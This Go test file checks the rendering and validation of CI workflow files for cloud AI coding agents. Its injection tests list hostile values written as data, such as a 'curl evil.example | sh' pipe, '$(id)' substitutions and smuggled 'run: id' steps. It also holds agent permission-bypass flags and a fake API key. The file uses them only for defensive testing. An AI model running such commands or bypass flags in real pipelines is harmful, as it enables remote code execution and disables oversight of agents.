package workflow

import (
	"strings"
	"testing"

	"gopkg.in/yaml.v3"

	"github.com/dshakes/halos/internal/harness/hutil/hutiltest"
	"github.com/dshakes/halos/internal/policy"
)

func renderOrg(ca *policy.CloudAgents) *policy.Org {
	return &policy.Org{Name: "acme", CloudAgents: ca, Workloads: &policy.Workloads{Audience: "halos-ci"}}
}

func TestRenderGoldens(t *testing.T) {
	tests := []struct {
		name string
		ca   *policy.CloudAgents
		want []string // golden name per file, in render order
	}{
		{"default", &policy.CloudAgents{
			Claude:  &policy.CloudAgent{Enabled: true, Repos: []string{"acme/app"}, Models: []string{"claude-sonnet-5"}},
			Copilot: &policy.CloudAgent{Enabled: true, Repos: []string{"acme/*"}, TimeoutMinutes: 45},
			Gemini:  &policy.CloudAgent{Enabled: true, Version: "0.34.0", Models: []string{"gemini-2.5-pro"}},
		}, []string{"claude.yml", "copilot-setup-steps.yml", "gemini.yml"}},
		{"workload", &policy.CloudAgents{Server: "https://halo.acme.example", HaloVersion: "v0.3.0",
			Claude: &policy.CloudAgent{Enabled: true, Identity: policy.CloudIdentityWorkload},
			Gemini: &policy.CloudAgent{Enabled: true, Identity: policy.CloudIdentityWorkload, Version: "0.34.0"},
		}, []string{"claude-workload.yml", "gemini-workload.yml"}},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			files, _, err := Render(renderOrg(tc.ca))
			if err != nil {
				t.Fatal(err)
			}
			if len(files) != len(tc.want) {
				t.Fatalf("got %d files, want %d", len(files), len(tc.want))
			}
			for i, f := range files {
				hutiltest.Golden(t, tc.want[i], f.Data)
				var doc map[string]any
				if err := yaml.Unmarshal(f.Data, &doc); err != nil || doc["jobs"] == nil {
					t.Errorf("%s: not a workflow: %v", f.Path, err)
				}
			}
		})
	}
}

func TestRenderWarnsAndSkips(t *testing.T) {
	files, warns, err := Render(renderOrg(&policy.CloudAgents{
		Claude: &policy.CloudAgent{Enabled: false},
		Codex:  &policy.CloudAgent{Enabled: true},
		Cursor: &policy.CloudAgent{Enabled: true},
		Gemini: &policy.CloudAgent{Enabled: true, Network: &policy.CloudNetwork{Mode: policy.NetworkNone}, MaxConcurrent: policy.CloudConcurrency{PerUser: 1}},
	}))
	if err != nil {
		t.Fatal(err)
	}
	if len(files) != 1 || files[0].Path != GeminiWorkflow {
		t.Fatalf("files %v: only gemini renders (claude disabled; codex and cursor are console vendors)", files)
	}
	all := strings.Join(warns, "\n")
	for _, w := range []string{"claude: disabled", "codex: configured in the vendor console", "cursor: configured in the vendor console",
		"gemini: network is not rendered", "gemini: maxConcurrent is enforced by halo-server", "gemini: version unset"} {
		if !strings.Contains(all, w) {
			t.Errorf("missing warning %q in\n%s", w, all)
		}
	}
	if files, warns, err := Render(&policy.Org{}); files != nil || warns != nil || err != nil {
		t.Fatal("no cloudAgents renders nothing")
	}
}

// TestAudienceInjection: an audience that validation would refuse, rendered
// anyway (validation bypassed), stays a quoted env value the token script
// reads as "$HALO_AUDIENCE"; the per-issuer GitHub override wins.
func TestAudienceInjection(t *testing.T) {
	ca := &policy.CloudAgents{Server: "https://halo.acme.example", HaloVersion: "v0.3.0",
		Claude: &policy.CloudAgent{Enabled: true, Identity: policy.CloudIdentityWorkload}}
	for _, aud := range []string{"x; curl evil.example | sh", "$(id)", "`id`", "x\nid", "x\"\n        run: id #", "x'\n- run: id"} {
		org := renderOrg(ca)
		org.Workloads.Audience = aud
		files, _, err := Render(org)
		if err != nil {
			t.Fatalf("%q: %v", aud, err)
		}
		var doc struct {
			Jobs map[string]struct {
				Steps []map[string]any `yaml:"steps"`
			} `yaml:"jobs"`
		}
		if err := yaml.Unmarshal(files[0].Data, &doc); err != nil {
			t.Fatalf("%q: %v", aud, err)
		}
		found := false
		for _, st := range doc.Jobs["claude"].Steps {
			if env, _ := st["env"].(map[string]any); env["HALO_AUDIENCE"] != nil {
				found = true
				if env["HALO_AUDIENCE"] != aud || st["run"] != tokenScript {
					t.Errorf("%q: env %v run %q", aud, env, st["run"])
				}
			}
		}
		if !found {
			t.Errorf("%q: no HALO_AUDIENCE step", aud)
		}
	}
	org := renderOrg(ca)
	org.Workloads.Issuers = []policy.WorkloadIssuer{{Name: "gl", URL: "https://gitlab.com", Audience: "gitlab-aud"},
		{Name: "gh", URL: "https://token.actions.githubusercontent.com", Audience: "gh-aud"}}
	files, _, err := Render(org)
	if err != nil || !strings.Contains(string(files[0].Data), `HALO_AUDIENCE: "gh-aud"`) {
		t.Fatalf("per-issuer GitHub audience not rendered: %v\n%s", err, files[0].Data)
	}
}

func TestCheck(t *testing.T) {
	ok := "permissions: {}\njobs:\n  a:\n    steps:\n      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n      - run: |\n" + indent(tokenScript, 10) + "        env:\n          X: ${{ github.event.comment.body }}\n"
	tests := []struct{ name, data, want string }{
		{"ok", ok, ""},
		{"bypass", ok + "      - run: claude --dangerously-skip-permissions\n", "bypass"},
		{"bypass in settings", ok + "          settings: '{\"permissions\":{\"defaultMode\":\"bypassPermissions\"}}'\n", "bypass"},
		{"tag pin", strings.Replace(ok, "@3d3c42e5aac5ba805825da76410c181273ba90b1", "@v4", 1), "not pinned"},
		{"short sha", strings.Replace(ok, "@3d3c42e5aac5ba805825da76410c181273ba90b1", "@3d3c42e", 1), "not pinned"},
		{"no top-level permissions", strings.Replace(ok, "permissions: {}\n", "", 1), "permissions: {}"},
		{"write-all", ok + "    permissions: write-all\n", "blanket"},
		{"expression in run block", strings.Replace(ok, "set -euo", "echo \"${{ github.event.comment.body }}\"; set -euo", 1), "inside a run script"},
		{"interpolated audience", strings.Replace(ok, `"$HALO_AUDIENCE"`, "halos; curl evil.example | sh", 1), "not one Halos renders"},
		{"command substitution", strings.Replace(ok, `"$HALO_AUDIENCE"`, "$(id)", 1), "not one Halos renders"},
		{"backtick", strings.Replace(ok, `"$HALO_AUDIENCE"`, "`id`", 1), "not one Halos renders"},
		{"extra line", strings.Replace(ok, `"$HALO_AUDIENCE"`+"\n", `"$HALO_AUDIENCE"`+"\n          id\n", 1), "not one Halos renders"},
		{"injected step", ok + "      - run: id\n", "not one Halos renders"},
		{"yaml break (second run key)", ok + "        run: id\n", "not a valid workflow"},
		{"expression in run line", ok + "      - run: echo ${{ github.head_ref }}\n", "inside a run script"},
		{"literal credential", ok + "          anthropic_api_key: sk-ant-api03-" + strings.Repeat("a", 40) + "\n", "literal credential"},
	}
	for _, tc := range tests {
		t.Run(tc.name, func(t *testing.T) {
			err := Check(File{Vendor: "claude", Path: ClaudeWorkflow, Data: []byte(tc.data)})
			if tc.want == "" {
				if err != nil {
					t.Fatal(err)
				}
				return
			}
			if err == nil || !strings.Contains(err.Error(), tc.want) {
				t.Fatalf("err %v, want %q", err, tc.want)
			}
		})
	}
}
